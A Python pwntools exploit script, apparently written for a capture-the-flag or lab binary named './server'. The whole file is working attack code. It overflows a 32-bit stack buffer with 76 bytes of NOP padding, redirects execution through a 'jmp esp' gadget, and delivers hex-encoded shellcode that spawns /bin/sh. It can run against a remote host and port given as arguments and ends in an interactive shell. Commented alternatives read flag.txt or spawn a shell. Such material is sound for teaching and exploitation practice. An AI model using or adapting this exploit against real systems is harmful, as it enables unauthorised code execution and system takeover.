from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    """
    This function allows switching between running the exploit locally, in GDB for debugging, or remotely.
    - GDB: Starts the program inside GDB for debugging.
    - REMOTE: Connects to a remote server at the specified IP and port.
    - Default: Runs the program locally.
    """
    if args.GDB:  # Run with GDB if the GDB argument is passed
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # Run remotely if the REMOTE argument is passed ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally if neither GDB nor REMOTE is specified
        return process([exe] + argv, *a, **kw)


# Specify GDB script for debugging, including any breakpoints or commands
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Binary filename
exe = './server'
# This loads the binary and automatically sets architecture, bits, OS, etc.
elf = context.binary = ELF(exe, checksec=False)
# Set logging level to 'debug' for verbose output during execution
context.log_level = 'debug'


# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start the process (local or remote based on args)
io = start()

# Offset to reach the EIP (return address) on the stack
padding = 76

# Address of the "jmp esp" instruction (used to hijack control flow)
jmp_esp = p32(0x0804919f)

# Alternative Shellcode Options:
# 1. To print the flag file (using 'cat')
# shellcode = asm(shellcraft.cat('flag.txt'))

# 2. To spawn a shell
# shellcode = asm(shellcraft.sh())

# 3. To exit the program cleanly (usually used after shellcode execution)
# shellcode += asm(shellcraft.exit())

# Shellcode in hexadecimal format (raw bytes for shellcode)
shellcode = bytes.fromhex('6a68682f2f2f73682f62696e89e368010101018134247269010131c9516a045901e15189e131d26a0b58cd80')

# Build the payload:
# - Padding: Fill the buffer to reach the return address (EIP)
# - jmp_esp: The address of the "jmp esp" instruction
# - NOPs: No-op instructions used to pad and ensure smooth flow to shellcode
# - Shellcode: The actual payload that will be executed after the buffer overflow
payload = flat(
    asm('nop') * padding,  # Padding to overflow the buffer
    jmp_esp,               # Address of "jmp esp" instruction to redirect execution
    #asm('nop') * 16,       # Extra NOPs for good measure (optional)
    shellcode              # The shellcode to execute (can be customized)
)

# Write the payload to a file for analysis or debugging
write("payload", payload)

# Send the payload to the process after the prompt ':'
io.sendlineafter(b':', payload)

# Once the exploit is successful, get interactive shell access or flag
io.interactive()

